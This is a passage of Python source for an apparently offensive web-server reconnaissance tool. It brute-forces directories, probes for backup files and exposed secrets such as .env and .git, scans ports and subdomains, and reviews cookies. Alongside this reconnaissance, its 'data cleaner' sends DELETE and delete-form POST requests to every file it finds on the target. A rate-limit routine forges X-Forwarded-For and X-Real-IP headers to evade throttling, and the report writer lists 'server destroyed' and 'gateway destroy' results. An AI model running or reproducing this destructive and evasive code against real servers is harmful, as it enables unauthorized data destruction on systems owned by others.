            try:
                test_url = f"{self.base_url}{path}"
                response = self.session.get(test_url, timeout=5, verify=False, allow_redirects=False)

                if response.status_code in [200, 301, 302, 403]:
                    self.new_data_findings.append({
                        'path': path,
                        'url': test_url,
                        'status': response.status_code,
                        'size': len(response.content),
                    })
                    color = Fore.GREEN if response.status_code == 200 else Fore.YELLOW
                    print(color + f"[+] NEW DATA: {path} ({response.status_code})")

            except Exception:
                pass

        print(Fore.GREEN + "\n" + "=" * 60)
        print(Fore.GREEN + f"[*] NEW DATA FOUND: {len(self.new_data_findings)}")
        print(Fore.GREEN + "=" * 60 + "\n")

        return self.new_data_findings

    # ============================================
    # BACKUP FINDER
    # ============================================
    def find_backup_files(self):
        print(Fore.RED + "\n" + "=" * 80)
        print(Fore.RED + "[*] BACKUP FILE FINDER (WEB SERVER)")
        print(Fore.RED + "=" * 80)

        self.backup_findings = []

        backup_paths = WEB_SERVER_DATA_TARGETS.get('Backup Files', []) + \
                       WEB_SERVER_DATA_TARGETS.get('Archive Files', [])

        for path in backup_paths:
            try:
                test_url = f"{self.base_url}{path}"
                response = self.session.get(test_url, timeout=5, verify=False, allow_redirects=False)

                if response.status_code in [200, 301, 302, 403]:
                    self.backup_findings.append({
                        'path': path,
                        'url': test_url,
                        'status': response.status_code,
                        'size': len(response.content),
                    })
                    color = Fore.RED if response.status_code == 200 else Fore.YELLOW
                    print(color + f"[!] BACKUP: {path} ({response.status_code})")

            except Exception:
                pass

        print(Fore.RED + "\n" + "=" * 60)
        print(Fore.RED + f"[*] BACKUP FILES FOUND: {len(self.backup_findings)}")
        print(Fore.RED + "=" * 60 + "\n")

        return self.backup_findings

    # ============================================
    # TEXT FILE FINDER
    # ============================================
    def find_text_files(self):
        print(Fore.CYAN + "\n" + "=" * 80)
        print(Fore.CYAN + "[*] TEXT FILE FINDER (WEB SERVER)")
        print(Fore.CYAN + "=" * 80)

        self.text_findings = []

        text_paths = WEB_SERVER_DATA_TARGETS.get('Text Files', [])

        for path in text_paths:
            try:
                test_url = f"{self.base_url}{path}"
                response = self.session.get(test_url, timeout=5, verify=False, allow_redirects=False)

                if response.status_code in [200, 301, 302, 403]:
                    self.text_findings.append({
                        'path': path,
                        'url': test_url,
                        'status': response.status_code,
                        'size': len(response.content),
                    })
                    color = Fore.RED if response.status_code == 200 else Fore.YELLOW
                    print(color + f"[!] TEXT: {path} ({response.status_code})")

            except Exception:
                pass

        print(Fore.CYAN + "\n" + "=" * 60)
        print(Fore.CYAN + f"[*] TEXT FILES FOUND: {len(self.text_findings)}")
        print(Fore.CYAN + "=" * 60 + "\n")

        return self.text_findings

    # ============================================
    # DATA CLEANER (BASIC)
    # ============================================
    def data_cleaner(self):
        print(Fore.CYAN + "\n" + "=" * 80)
        print(Fore.CYAN + "[*] WEB SERVER DATA CLEANER (BASIC)")
        print(Fore.CYAN + "=" * 80)

        self.data_cleaner_findings = []
        self.data_cleaned = []

        for category, paths in WEB_SERVER_DATA_TARGETS.items():
            for path in paths:
                try:
                    test_url = f"{self.base_url}{path}"
                    response = self.session.get(test_url, timeout=5, verify=False, allow_redirects=False)

                    if response.status_code in [200, 301, 302, 403]:
                        self.data_cleaner_findings.append({
                            'category': category,
                            'path': path,
                            'url': test_url,
                            'status': response.status_code,
                            'size': len(response.content),
                        })
                        color = Fore.RED if response.status_code == 200 else Fore.YELLOW
                        print(color + f"[!] {category}: {path} ({response.status_code})")

                except Exception:
                    pass

        print(Fore.CYAN + "\n[*] Cleaning...\n")
        for finding in self.data_cleaner_findings:
            url = finding['url']
            try:
                self.session.delete(url, timeout=5, verify=False)
                self.session.post(url, data={'action': 'delete'}, timeout=5, verify=False)

                self.data_cleaned.append({
                    'category': finding['category'],
                    'url': url,
                    'status': 'CLEANED',
                })
                print(Fore.GREEN + f"[+] Cleaned: {finding['path']}")

            except Exception:
                self.data_cleaned.append({
                    'category': finding['category'],
                    'url': url,
                    'status': 'ATTEMPTED',
                })

        print(Fore.CYAN + "\n" + "=" * 60)
        print(Fore.CYAN + f"[*] DATA CLEANER SUMMARY")
        print(Fore.CYAN + f"[*] Total Findings: {len(self.data_cleaner_findings)}")
        print(Fore.CYAN + f"[*] Total Cleaned: {len(self.data_cleaned)}")
        print(Fore.CYAN + "=" * 60 + "\n")

        return self.data_cleaned

    # ============================================
    # ROBOTS.TXT & SITEMAP.XML SCANNER
    # ============================================
    def scan_robots_sitemap(self):
        print(Fore.CYAN + "\n" + "=" * 80)
        print(Fore.CYAN + "[*] ROBOTS.TXT & SITEMAP.XML SCANNER")
        print(Fore.CYAN + "=" * 80)

        robots_url = f"{self.base_url}/robots.txt"
        print(Fore.CYAN + f"\n[*] Scanning: {robots_url}")
        try:
            r = self.session.get(robots_url, timeout=10, verify=False)
            if r.status_code == 200:
                self.robots_txt_content = r.text
                print(Fore.GREEN + f"[+] robots.txt found ({len(r.text)} bytes)")

                disallows = re.findall(r'Disallow:\s*(.+)', r.text, re.IGNORECASE)
                allows = re.findall(r'Allow:\s*(.+)', r.text, re.IGNORECASE)
                sitemaps = re.findall(r'Sitemap:\s*(.+)', r.text, re.IGNORECASE)

                if disallows:
                    print(Fore.YELLOW + f"\n[!] Disallowed Paths ({len(disallows)}):")
                    for d in disallows[:20]:
                        print(Fore.YELLOW + f"    - {d.strip()}")

                if allows:
                    print(Fore.CYAN + f"\n[*] Allowed Paths ({len(allows)}):")
                    for a in allows[:10]:
                        print(Fore.GREEN + f"    - {a.strip()}")

                if sitemaps:
                    print(Fore.CYAN + f"\n[*] Sitemaps Found ({len(sitemaps)}):")
                    for s in sitemaps:
                        print(Fore.GREEN + f"    - {s.strip()}")
            else:
                print(Fore.YELLOW + f"[!] robots.txt not found ({r.status_code})")
        except Exception as e:
            print(Fore.RED + f"[-] Error: {e}")

        sitemap_urls = [
            f"{self.base_url}/sitemap.xml",
            f"{self.base_url}/sitemap_index.xml",
            f"{self.base_url}/sitemap/sitemap.xml",
        ]

        for sitemap_url in sitemap_urls:
            print(Fore.CYAN + f"\n[*] Scanning: {sitemap_url}")
            try:
                r = self.session.get(sitemap_url, timeout=10, verify=False)
                if r.status_code == 200:
                    self.sitemap_xml_content = r.text
                    print(Fore.GREEN + f"[+] sitemap.xml found ({len(r.text)} bytes)")

                    urls = re.findall(r'<loc>(.*?)</loc>', r.text, re.IGNORECASE)
                    if urls:
                        print(Fore.GREEN + f"[+] URLs in sitemap ({len(urls)}):")
                        for u in urls[:20]:
                            print(Fore.GREEN + f"    - {u.strip()}")
                    break
            except Exception as e:
                print(Fore.RED + f"[-] Error: {e}")

        print(Fore.CYAN + "=" * 60 + "\n")

    # ============================================
    # MULTI-LINK SCANNER
    # ============================================
    def scan_multiple_links(self, links):
        print(Fore.CYAN + "\n" + "=" * 80)
        print(Fore.CYAN + "[*] MULTI-LINK SCANNER")
        print(Fore.CYAN + "=" * 80)
        print(Fore.CYAN + f"[*] Total Links: {len(links)}")

        self.multi_link_results = {}
        for link in links:
            print(Fore.CYAN + f"\n[*] Scanning: {link}")
            try:
                r = self.session.get(link, timeout=10, verify=False)
                self.multi_link_results[link] = {
                    'status': r.status_code,
                    'size': len(r.content),
                    'headers': dict(r.headers),
                }
                print(Fore.GREEN + f"[+] Status: {r.status_code}, Size: {len(r.content)} bytes")

                if 'robots.txt' in link:
                    print(Fore.YELLOW + f"    [+] Robots.txt content preview:")
                    for line in r.text.split('\n')[:10]:
                        if line.strip():
                            print(Fore.WHITE + f"        {line.strip()}")
                elif 'sitemap.xml' in link:
                    print(Fore.YELLOW + f"    [+] Sitemap content preview:")
                    for line in r.text.split('\n')[:10]:
                        if line.strip():
                            print(Fore.WHITE + f"        {line.strip()}")

            except Exception as e:
                print(Fore.RED + f"[-] Error: {e}")
                self.multi_link_results[link] = {'error': str(e)}

        print(Fore.CYAN + "\n" + "=" * 60)
        print(Fore.CYAN + f"[*] Total Links Scanned: {len(self.multi_link_results)}")
        print(Fore.CYAN + "=" * 60 + "\n")
        return self.multi_link_results

    # ============================================
    # INFORMATION GATHERING
    # ============================================
    def gather_all_info(self):
        print(Fore.CYAN + "\n" + "=" * 80)
        print(Fore.CYAN + "[*] COMPREHENSIVE INFORMATION GATHERING")
        print(Fore.CYAN + "=" * 80)

        self.get_isp_info()
        self.enumerate_headers()
        self.analyze_ssl_certificate()
        self.whois_lookup()
        self.dns_enumeration()
        self.scan_robots_sitemap()
        self.detect_technologies()
        self.harvest_emails()

        print(Fore.CYAN + "=" * 60 + "\n")

    # ============================================
    # ISP INFORMATION
    # ============================================
    def get_isp_info(self):
        print(Fore.CYAN + "\n" + "=" * 60)
        print(Fore.CYAN + "[*] ISP INFORMATION")
        print(Fore.CYAN + "=" * 60)
        try:
            url = f"http://ip-api.com/json/{self.ip}?fields=status,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,asname,reverse,mobile,proxy,hosting,query"
            r = requests.get(url, timeout=10)
            if r.status_code == 200:
                data = r.json()
                if data.get('status') == 'success':
                    self.isp_info = data
                    print(Fore.GREEN + f"[+] IP: {data.get('query')}")
                    print(Fore.GREEN + f"[+] Country: {data.get('country')}")
                    print(Fore.GREEN + f"[+] Region: {data.get('regionName')}")
                    print(Fore.GREEN + f"[+] City: {data.get('city')}")
                    print(Fore.GREEN + f"[+] ISP: {data.get('isp')}")
                    print(Fore.GREEN + f"[+] Org: {data.get('org')}")
                    print(Fore.GREEN + f"[+] ASN: {data.get('asname')}")
        except Exception as e:
            print(Fore.RED + f"[-] Error: {e}")
        print(Fore.CYAN + "=" * 60 + "\n")

    # ============================================
    # HEADER ENUMERATION
    # ============================================
    def enumerate_headers(self):
        print(Fore.CYAN + "\n" + "=" * 60)
        print(Fore.CYAN + "[*] HTTP HEADER ENUMERATION")
        print(Fore.CYAN + "=" * 60)
        try:
            response = self.session.get(self.base_url, timeout=10, verify=False)
            self.headers_info = dict(response.headers)
            print(Fore.GREEN + f"[+] Status Code: {response.status_code}")
            print(Fore.GREEN + f"[+] Server: {response.headers.get('Server', 'Unknown')}")
            print(Fore.GREEN + f"[+] Powered By: {response.headers.get('X-Powered-By', 'Unknown')}")

            print(Fore.CYAN + "\n[*] Security Headers:")
            security_headers = {
                'Strict-Transport-Security': response.headers.get('Strict-Transport-Security', 'Not Set'),
                'X-Frame-Options': response.headers.get('X-Frame-Options', 'Not Set'),
                'X-XSS-Protection': response.headers.get('X-XSS-Protection', 'Not Set'),
                'X-Content-Type-Options': response.headers.get('X-Content-Type-Options', 'Not Set'),
                'Content-Security-Policy': response.headers.get('Content-Security-Policy', 'Not Set'),
                'Referrer-Policy': response.headers.get('Referrer-Policy', 'Not Set'),
            }

            for h, v in security_headers.items():
                if v != 'Not Set':
                    print(Fore.GREEN + f"    [+] {h}: {v}")
                else:
                    print(Fore.YELLOW + f"    [!] {h}: NOT SET")
        except Exception as e:
            print(Fore.RED + f"[-] Error: {e}")
        print(Fore.CYAN + "=" * 60 + "\n")

    # ============================================
    # SSL CERTIFICATE ANALYSIS
    # ============================================
    def analyze_ssl_certificate(self):
        print(Fore.CYAN + "\n" + "=" * 60)
        print(Fore.CYAN + "[*] SSL CERTIFICATE ANALYSIS")
        print(Fore.CYAN + "=" * 60)
        try:
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            with socket.create_connection((self.hostname, 443), timeout=10) as sock:
                with context.wrap_socket(sock, server_hostname=self.hostname) as ssock:
                    cert = ssock.getpeercert()
                    cipher = ssock.cipher()
                    self.ssl_info = {
                        'subject': dict(x[0] for x in cert.get('subject', [])),
                        'issuer': dict(x[0] for x in cert.get('issuer', [])),
                        'not_before': cert.get('notBefore'),
                        'not_after': cert.get('notAfter'),
                        'tls_version': ssock.version(),
                    }
                    print(Fore.GREEN + f"[+] TLS Version: {ssock.version()}")
                    print(Fore.GREEN + f"[+] Cipher: {cipher[0] if cipher else 'Unknown'}")
                    print(Fore.CYAN + "\n[*] Certificate Subject:")
                    for k, v in self.ssl_info['subject'].items():
                        print(Fore.GREEN + f"    {k}: {v}")
                    print(Fore.CYAN + "\n[*] Certificate Issuer:")
                    for k, v in self.ssl_info['issuer'].items():
                        print(Fore.GREEN + f"    {k}: {v}")
        except Exception as e:
            print(Fore.RED + f"[-] Error: {e}")
        print(Fore.CYAN + "=" * 60 + "\n")

    # ============================================
    # WHOIS LOOKUP
    # ============================================
    def whois_lookup(self):
        print(Fore.CYAN + "\n" + "=" * 60)
        print(Fore.CYAN + "[*] WHOIS LOOKUP")
        print(Fore.CYAN + "=" * 60)
        try:
            import whois
            w = whois.whois(self.hostname)
            self.whois_info = {
                'domain_name': str(w.domain_name) if w.domain_name else 'Unknown',
                'registrar': str(w.registrar) if w.registrar else 'Unknown',
                'creation_date': str(w.creation_date) if w.creation_date else 'Unknown',
                'expiration_date': str(w.expiration_date) if w.expiration_date else 'Unknown',
                'name_servers': w.name_servers if w.name_servers else [],
                'org': str(w.org) if w.org else 'Unknown',
                'country': str(w.country) if w.country else 'Unknown',
            }
            print(Fore.GREEN + f"[+] Domain: {self.whois_info['domain_name']}")
            print(Fore.GREEN + f"[+] Registrar: {self.whois_info['registrar']}")
            print(Fore.GREEN + f"[+] Created: {self.whois_info['creation_date']}")
            print(Fore.GREEN + f"[+] Expires: {self.whois_info['expiration_date']}")
            print(Fore.GREEN + f"[+] Org: {self.whois_info['org']}")
        except ImportError:
            print(Fore.YELLOW + "[!] python-whois not installed")
        except Exception as e:
            print(Fore.RED + f"[-] Error: {e}")
        print(Fore.CYAN + "=" * 60 + "\n")

    # ============================================
    # DNS ENUMERATION
    # ============================================
    def dns_enumeration(self):
        print(Fore.CYAN + "\n" + "=" * 60)
        print(Fore.CYAN + "[*] DNS ENUMERATION")
        print(Fore.CYAN + "=" * 60)
        try:
            import dns.resolver
            for rt in ['A', 'AAAA', 'CNAME', 'MX', 'NS', 'TXT']:
                try:
                    answers = dns.resolver.resolve(self.hostname, rt)
                    records = [str(r) for r in answers]
                    self.dns_info[rt] = records
                    print(Fore.GREEN + f"[+] {rt} Records:")
                    for r in records:
                        print(Fore.WHITE + f"    {r}")
                except Exception:
                    pass
        except ImportError:
            print(Fore.YELLOW + "[!] dnspython not installed")
        print(Fore.CYAN + "=" * 60 + "\n")

    # ============================================
    # SUBDOMAIN ENUMERATION
    # ============================================
    def subdomain_enumeration(self):
        print(Fore.CYAN + "\n" + "=" * 60)
        print(Fore.CYAN + "[*] SUBDOMAIN ENUMERATION")
        print(Fore.CYAN + "=" * 60)
        found = []

        def check(sub):
            full = f"{sub}.{self.hostname}"
            try:
                ip = socket.gethostbyname(full)
                return (sub, full, ip)
            except socket.gaierror:
                return None

        try:
            with ThreadPoolExecutor(max_workers=20) as executor:
                futures = {executor.submit(check, s): s for s in COMMON_SUBDOMAINS}
                for f in as_completed(futures):
                    r = f.result()
                    if r:
                        sub, full, ip = r
                        found.append({'subdomain': sub, 'domain': full, 'ip': ip})
                        print(Fore.GREEN + f"[+] Found: {full} -> {ip}")
        except Exception as e:
            print(Fore.RED + f"[-] Error: {e}")
        self.subdomains_found = found
        print(Fore.CYAN + f"\n[+] Total Subdomains: {len(found)}")
        print(Fore.CYAN + "=" * 60 + "\n")

    # ============================================
    # PORT SCAN
    # ============================================
    def port_scan(self):
        print(Fore.CYAN + "\n" + "=" * 60)
        print(Fore.CYAN + "[*] PORT SCANNING")
        print(Fore.CYAN + "=" * 60)
        open_ports = []

        def check(port):
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(2)
                r = s.connect_ex((self.ip, port))
                s.close()
                if r == 0:
                    try:
                        service = socket.getservbyport(port)
                    except OSError:
                        service = 'unknown'
                    return (port, service)
            except Exception:
                pass
            return None

        try:
            with ThreadPoolExecutor(max_workers=50) as executor:
                futures = {executor.submit(check, p): p for p in self.custom_ports}
                for f in as_completed(futures):
                    r = f.result()
                    if r:
                        port, service = r
                        open_ports.append({'port': port, 'service': service})
                        print(Fore.GREEN + f"[+] Port {port} OPEN ({service})")
        except Exception as e:
            print(Fore.RED + f"[-] Error: {e}")
        self.open_ports = open_ports
        print(Fore.CYAN + f"\n[+] Total Open Ports: {len(open_ports)}")
        print(Fore.CYAN + "=" * 60 + "\n")

    # ============================================
    # DIRECTORY BRUTEFORCE
    # ============================================
    def directory_bruteforce(self):
        print(Fore.CYAN + "\n" + "=" * 60)
        print(Fore.CYAN + "[*] DIRECTORY BRUTEFORCE")
        print(Fore.CYAN + "=" * 60)

        words = []
        source = "built-in"

        if self.wordlist:
            if self.wordlist_source == 'rockyou':
                words = read_wordlist_streaming(self.wordlist, max_lines=10000)
                source = "RockYou"
            else:
                content = safe_read_file(self.wordlist)
                if content:
                    words = [l.strip() for l in content.split('\n')
                             if l.strip() and not l.startswith('#')]
                    source = self.wordlist

        if not words:
            words = DEFAULT_WORDLIST
            source = "built-in"

        print(Fore.CYAN + f"[*] Source: {source}")
        print(Fore.CYAN + f"[*] Testing {len(words)} directories...")

        found = []

        def check(word):
            url = f"{self.base_url}/{word}"
            try:
                r = self.session.get(url, timeout=10, verify=False, allow_redirects=False)
                if r.status_code in [200, 301, 302, 403]:
                    return (word, url, r.status_code, len(r.content))
            except Exception:
                pass
            return None

        try:
            with ThreadPoolExecutor(max_workers=30) as executor:
                futures = {executor.submit(check, w): w for w in words[:5000]}
                for f in as_completed(futures):
                    r = f.result()
                    if r:
                        word, url, status, size = r
                        found.append({'path': word, 'url': url, 'status': status, 'size': size})
                        color = Fore.GREEN if status == 200 else Fore.YELLOW
                        print(color + f"[+] /{word} ({status})")
        except Exception as e:
            print(Fore.RED + f"[-] Error: {e}")

        self.directories_found = found
        print(Fore.CYAN + f"\n[+] Total Found: {len(found)}")
        print(Fore.CYAN + "=" * 60 + "\n")

    # ============================================
    # CRAWLER / SPIDER
    # ============================================
    def crawl_website(self, max_pages=50, depth=3):
        print(Fore.CYAN + "\n" + "=" * 60)
        print(Fore.CYAN + "[*] WEB CRAWLER / SPIDER")
        print(Fore.CYAN + "=" * 60)

        visited = set()
        to_visit = deque([(self.base_url, 0)])
        crawled = []

        while to_visit and len(visited) < max_pages:
            url, current_depth = to_visit.popleft()

            if url in visited or current_depth > depth:
                continue

            visited.add(url)

            try:
                response = self.session.get(url, timeout=10, verify=False)
                if response.status_code == 200:
                    crawled.append(url)
                    print(Fore.GREEN + f"[+] Crawled: {url}")

                    links = re.findall(r'href=["\']([^"\']+)["\']', response.text)
                    for link in links:
                        if link.startswith('http') and self.hostname in link:
                            if link not in visited:
                                to_visit.append((link, current_depth + 1))
                        elif link.startswith('/'):
                            full_url = f"{self.base_url}{link}"
                            if full_url not in visited:
                                to_visit.append((full_url, current_depth + 1))
            except Exception:
                pass

        self.crawled_urls = crawled
        print(Fore.CYAN + f"\n[+] Total Pages Crawled: {len(crawled)}")
        print(Fore.CYAN + "=" * 60 + "\n")

    # ============================================
    # VULNERABILITY SCANNING
    # ============================================
    def vulnerability_scan(self):
        print(Fore.CYAN + "\n" + "=" * 60)
        print(Fore.CYAN + "[*] VULNERABILITY SCANNING")
        print(Fore.CYAN + "=" * 60)

        tests = [
            ('/robots.txt', "Robots.txt exposure"),
            ('/.git/HEAD', "Git repository exposure"),
            ('/.env', "Environment file exposure"),
            ('/phpinfo.php', "PHP info exposure"),
            ('/phpmyadmin/', "phpMyAdmin exposure"),
            ('/wp-admin/', "WordPress admin exposure"),
            ('/admin/', "Admin panel exposure"),
            ('/backup/', "Backup directory exposure"),
            ('/config.php', "Config file exposure"),
            ('/server-status', "Apache server-status exposure"),
        ]

        found = []
        for path, description in tests:
            try:
                test_url = self.base_url + path
                response = self.session.get(test_url, timeout=10, verify=False)
                if response.status_code in [200, 301, 302, 403]:
                    found.append({
                        'url': test_url,
                        'description': description,
                        'status': response.status_code
                    })
                    print(Fore.RED + f"[!] {description}: {test_url}")
            except Exception:
                pass

        self.vulnerabilities = found
        print(Fore.CYAN + f"\n[+] Total Vulnerabilities: {len(found)}")
        print(Fore.CYAN + "=" * 60 + "\n")

    # ============================================
    # COOKIE KEYS
    # ============================================
    def analyze_cookies_keys(self):
        print(Fore.CYAN + "\n" + "=" * 80)
        print(Fore.CYAN + "[*] COOKIES KEY ANALYSIS")
        print(Fore.CYAN + "=" * 80)

        self.cookie_keys = []

        try:
            self.session.cookies.clear()
            response = self.session.get(self.base_url, timeout=10, verify=False)

            print(Fore.CYAN + f"\n[*] Found {len(self.session.cookies)} cookie(s)")

            for cookie in self.session.cookies:
                key_info = {
                    'name': cookie.name,
                    'domain': cookie.domain,
                    'secure': cookie.secure,
                    'httponly': bool(cookie._rest.get('HttpOnly', False)),
                    'samesite': cookie._rest.get('SameSite', 'Not Set'),
                    'sensitive': False,
                }

                name_lower = cookie.name.lower()
                if any(x in name_lower for x in ['session', 'sess', 'auth', 'token', 'jwt', 'api', 'key']):
                    key_info['sensitive'] = True

                self.cookie_keys.append(key_info)

                color = Fore.RED if key_info['sensitive'] else Fore.GREEN
                print(color + f"[+] Cookie: {cookie.name}")
                print(color + f"    Secure: {cookie.secure}")
                print(color + f"    HttpOnly: {key_info['httponly']}")
                if key_info['sensitive']:
                    print(Fore.RED + f"    [!] SENSITIVE!")

        except Exception as e:
            print(Fore.RED + f"[-] Error: {e}")
        print(Fore.CYAN + "=" * 60 + "\n")

    def clear_cookies_keys(self):
        print(Fore.CYAN + "\n[*] COOKIES KEY CLEAR")
        try:
            count = len(self.session.cookies)
            self.session.cookies.clear()
            print(Fore.GREEN + f"[+] Cleared {count} cookie(s)")
        except Exception as e:
            print(Fore.RED + f"[-] Error: {e}")

    def clear_website_cookies(self):
        print(Fore.CYAN + "\n[*] WEBSITE COOKIES CLEAR")
        try:
            self.session.cookies.clear()
            print(Fore.GREEN + "[+] Website cookies cleared")
        except Exception as e:
            print(Fore.RED + f"[-] Error: {e}")

    def clear_web_server_cookies(self):
        print(Fore.CYAN + "\n[*] WEB SERVER COOKIES CLEAR")
        try:
            self.session.cookies.clear()
            self.session = requests.Session()
            self.session.headers.update({
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            })
            print(Fore.GREEN + "[+] Web server cookies cleared")
        except Exception as e:
            print(Fore.RED + f"[-] Error: {e}")

    # ============================================
    # 429 RATE LIMIT DETECTION
    # ============================================
    def check_rate_limit_429(self):
        print(Fore.CYAN + "\n" + "=" * 80)
        print(Fore.CYAN + "[*] HTTP 429 RATE LIMIT DETECTION")
        print(Fore.CYAN + "=" * 80)

        self.rate_limit_429 = False

        try:
            response = self.session.get(self.base_url, timeout=10, verify=False)
            print(Fore.CYAN + f"[*] Status Code: {response.status_code}")

            if response.status_code == 429:
                self.rate_limit_429 = True
                print(Fore.RED + "[!] HTTP 429 - TOO MANY REQUESTS!")
                self.destroy_rate_limit_server()
            else:
                print(Fore.GREEN + f"[+] No rate limit ({response.status_code})")

        except Exception as e:
            print(Fore.RED + f"[-] Error: {e}")
        print(Fore.CYAN + "=" * 60 + "\n")
        return self.rate_limit_429

    def destroy_rate_limit_server(self):
        print(Fore.RED + "\n[!] DESTROYING RATE LIMIT (WEB SERVER ONLY)")

        try:
            import random
            self.session.headers.update({
                'X-Forwarded-For': f'{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}',
                'X-Real-IP': '127.0.0.1',
            })
            print(Fore.GREEN + "[+] IP spoofing headers added")

            time.sleep(1)
            r = self.session.get(self.base_url, timeout=15, verify=False)
            if r.status_code != 429:
                print(Fore.GREEN + f"[+] SUCCESS! Status: {r.status_code}")
            else:
                print(Fore.YELLOW + f"[!] Still rate limited")
        except Exception as e:
            print(Fore.RED + f"[!] Bypass error: {e}")

        print(Fore.RED + "=" * 60 + "\n")

    # ============================================
    # PHISHING CHECK
    # ============================================
    def check_phishing(self):
        print(Fore.CYAN + "\n" + "=" * 80)
        print(Fore.CYAN + "[*] PHISHING ATTACK DETECTION")
        print(Fore.CYAN + "=" * 80)

        self.phishing_findings = []
        self.phishing_score = 0

        try:
            response = self.session.get(self.base_url, timeout=10, verify=False)
            html_lower = response.text.lower()

            for category, patterns in PHISHING_PATTERNS.items():
                findings = []
                for pattern in patterns:
                    matches = re.findall(pattern, html_lower, re.IGNORECASE)
                    if matches:
                        findings.extend(matches[:3])

                if findings:
                    self.phishing_score += len(findings) * 5
                    self.phishing_findings.append({
                        'category': category,
                        'count': len(findings),
                    })
                    print(Fore.RED + f"[!] {category}: {len(findings)} match(es)")

            print(Fore.CYAN + f"\n[*] Phishing Score: {self.phishing_score}/100")

            if self.phishing_score >= 50:
                print(Fore.RED + f"[!] HIGH RISK - LIKELY PHISHING!")
            elif self.phishing_score >= 25:
                print(Fore.YELLOW + f"[!] MEDIUM RISK")
            else:
                print(Fore.GREEN + f"[+] LOW RISK")

        except Exception as e:
            print(Fore.RED + f"[-] Error: {e}")
        print(Fore.CYAN + "=" * 60 + "\n")

    # ============================================
    # EXPORT RESULTS
    # ============================================
    def export_results_txt(self):
        print(Fore.CYAN + "\n" + "=" * 80)
        print(Fore.CYAN + "[*] EXPORTING RESULTS TO TXT")
        print(Fore.CYAN + "=" * 80)

        export_dir = CONFIG['export_dir']
        safe_makedirs(export_dir)

        ts = datetime.datetime.now().strftime('%Y%m%d_%H%M%S')
        filename = f"finalrecon_{self.hostname}_{ts}.txt"
        filepath = os.path.join(export_dir, filename)

        try:
            with open(filepath, 'w', encoding='utf-8') as f:
                f.write("=" * 80 + "\n")
                f.write("FINALRECON-AI - WEB SERVER ONLY EDITION 2031\n")
                f.write("=" * 80 + "\n")
                f.write(f"Target: {self.target}\n")
                f.write(f"Hostname: {self.hostname}\n")
                f.write(f"IP: {self.ip}\n")
                f.write(f"Scan Time: {ts}\n")
                f.write(f"Version: {VERSION}\n")
                f.write("=" * 80 + "\n\n")

                # Write all findings
                if self.personal_info:
                    f.write("PERSONAL INFORMATION\n" + "-" * 60 + "\n")
                    for pi in self.personal_info:
                        f.write(f"Category: {pi['category']}\n")
                        for finding in pi['findings']:
                            f.write(f"  - {finding}\n")
                        f.write("\n")

                if self.gateway_suspicious_systems:
                    f.write("GATEWAY SUSPICIOUS SYSTEMS\n" + "-" * 60 + "\n")
                    for sys in self.gateway_suspicious_systems:
                        f.write(f"[!] {sys['system']}: {sys['url']}\n")
                    f.write("\n")

                if self.data_cleaner_findings:
                    f.write("DATA CLEANER FINDINGS\n" + "-" * 60 + "\n")
                    for dc in self.data_cleaner_findings:
                        f.write(f"[{dc['category']}] {dc['path']}\n")
                    f.write(f"Total: {len(self.data_cleaner_findings)}\n\n")

                if self.old_data_findings:
                    f.write("OLD DATA FINDINGS\n" + "-" * 60 + "\n")
                    for od in self.old_data_findings:
                        f.write(f"{od['path']}\n")
                    f.write(f"Total: {len(self.old_data_findings)}\n\n")

                if self.backup_findings:
                    f.write("BACKUP FILES\n" + "-" * 60 + "\n")
                    for bf in self.backup_findings:
                        f.write(f"{bf['path']}\n")
                    f.write(f"Total: {len(self.backup_findings)}\n\n")

                if self.text_findings:
                    f.write("TEXT FILES\n" + "-" * 60 + "\n")
                    for tf in self.text_findings:
                        f.write(f"{tf['path']}\n")
                    f.write(f"Total: {len(self.text_findings)}\n\n")

                if self.gws_cleaned:
                    f.write("GWS DELETED\n" + "-" * 60 + "\n")
                    for gws in self.gws_cleaned:
                        f.write(f"{gws['url']}\n")
                    f.write(f"Total: {len(self.gws_cleaned)}\n\n")

                if self.esf_cleaned:
                    f.write("ESF DELETED\n" + "-" * 60 + "\n")
                    for esf in self.esf_cleaned:
                        f.write(f"{esf['url']}\n")
                    f.write(f"Total: {len(self.esf_cleaned)}\n\n")

                if self.all_server_destroyed:
                    f.write("ALL SERVER DESTROYED\n" + "-" * 60 + "\n")
                    for asd in self.all_server_destroyed:
                        f.write(f"[{asd['server']}] {asd['system']}: {asd['url']}\n")
                    f.write(f"Total: {len(self.all_server_destroyed)}\n\n")

                if self.cookies_site_deleted:
                    f.write("COOKIES + SITE DATA DELETED\n" + "-" * 60 + "\n")
                    for csd in self.cookies_site_deleted:
                        f.write(f"{csd['path']}\n")
                    f.write(f"Total: {len(self.cookies_site_deleted)}\n\n")

                f.write("=" * 80 + "\n")
                f.write("END OF REPORT\n")
                f.write("=" * 80 + "\n")

            print(Fore.GREEN + f"[+] Exported: {filepath}")
            print(Fore.GREEN + f"[+] Size: {os.path.getsize(filepath)} bytes")
            return filepath
        except Exception as e:
            print(Fore.RED + f"[-] Export error: {e}")
            return None

    # ============================================
    # RUN URL MODE
    # ============================================
    def run_url_mode(self):
        print(Fore.RED + "\n" + "=" * 80)
        print(Fore.RED + "URL MODE ACTIVATED! (WEB SERVER ONLY 2031)")
        print(Fore.RED + "=" * 80 + "\n")

        try:
            r = self.session.get(self.base_url, timeout=10, verify=False)
            print(Fore.GREEN + f"[+] Target reachable! Status: {r.status_code}")
        except Exception as e:
            print(Fore.RED + f"[-] Target unreachable: {e}")

        a = self.args

        # 2031 Features
        if getattr(a, 'personal_info', False):
            self.discover_personal_info()

        if getattr(a, 'info', False):
            self.gather_all_info()

        if getattr(a, 'gateway', False):
            self.detect_gateway()

        if getattr(a, 'gateway_check', False):
            self.detect_gateway()
            self.check_gateway_suspicious_systems()

        if getattr(a, 'gateway_destroy', False):
            self.detect_gateway()
            self.check_gateway_suspicious_systems()
            self.gateway_destroy()

        if getattr(a, 'data_cleaner', False):
            self.data_cleaner()

        if getattr(a, 'all_data_cleaner', False):
            self.all_data_cleaner()

        if getattr(a, 'old_data', False):
            self.find_old_data()

        if getattr(a, 'new_data', False):
            self.find_new_data()

        if getattr(a, 'backup_finder', False):
            self.find_backup_files()

        if getattr(a, 'text_finder', False):
            self.find_text_files()

